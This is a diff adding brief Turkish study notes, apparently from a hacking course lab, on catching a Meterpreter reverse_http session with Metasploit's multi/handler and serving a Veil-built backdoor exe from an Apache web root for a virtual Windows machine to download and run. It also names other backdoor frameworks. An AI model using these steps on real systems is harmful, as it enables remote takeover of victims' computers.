@@ -1,0 +1,25 @@
+Multi handler -> kullanılan payload veya bağlantıları yönetmek için kullanılır
+
+Giriş:
+
+1- msfconsole
+2- use exploit/multi/handler -> modüle giriş yapar
+3- show options -> ayarları gösterir
+4- set PAYLOAD windows/meterpreter/reverse_http -> payload'ı yani kullanılacak aracı ayarlar
+5- exploit -j -z -> payload'ı çalıştırır
+
+bu işlem sonrasında sunucudan gelen http bağlantıları yakalanarak trojan üzerinden hacklenmeye çalışılır.
+
+/var/www/html/backdoors/ -> bu dosya yoluna geliyoruz ve Veil ile oluşturduğumuz exe dosymızı kopyalıyoruz
+
+service apache2 start -> karşıdaki cihazı hacklemek için web servisini başlatıyoruz. (http portunu kullandığımız için)?
+
+bu işlemden sonra sanal windows'tan kaliIP/backdoors yazarak sunucumuzdaki exe dosyasının bulunduğu yere gidelim ve exe dosyasını indirelim
+indirme işleminden sonra exe dosyasının indirildiği yere gidip dosyayı çalıştarlım ve kali linux'ta artık win dosyalarına erişebiliyoruz.
+
+Diğer backdoor oluşturma framework'leri:
+
+- veil
+- fatrat
+- unicorn
+- empire
